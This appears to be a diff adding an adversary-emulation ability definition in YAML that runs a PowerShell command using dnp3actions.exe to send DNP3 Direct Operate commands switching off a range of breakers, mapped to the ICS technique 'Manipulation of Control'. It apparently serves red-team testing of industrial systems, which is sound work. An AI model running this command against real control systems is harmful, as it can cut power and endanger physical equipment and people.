@@ -1,0 +1,22 @@
+---
+
+- id: 2a4109a7-5a44-42a5-8944-83b0ba93ed47
+  name: DNP3 Toggle OFF Breakers DO
+  description: |
+    DNP3 Function Code 5 (0x05) DIRECT_OPERATE
+
+    Toggle OFF a range of specified breakers using the direct-operate function code.
+  tactic: impact
+  technique:
+    attack_id: T0831
+    name: Manipulation of Control
+  repeatable: True
+  platforms:
+    windows:
+      psh:
+        cleanup: rm dnp3actions.exe
+        command: |
+          .\dnp3actions.exe  #{dnp3.server.ip} -p #{dnp3.server.port} #{dnp3.local.link} #{dnp3.remote.link}
+          toggle-off-do --start #{dnp3.start.index} --end #{dnp3.end.index}
+        payloads:
+        - dnp3actions.exe
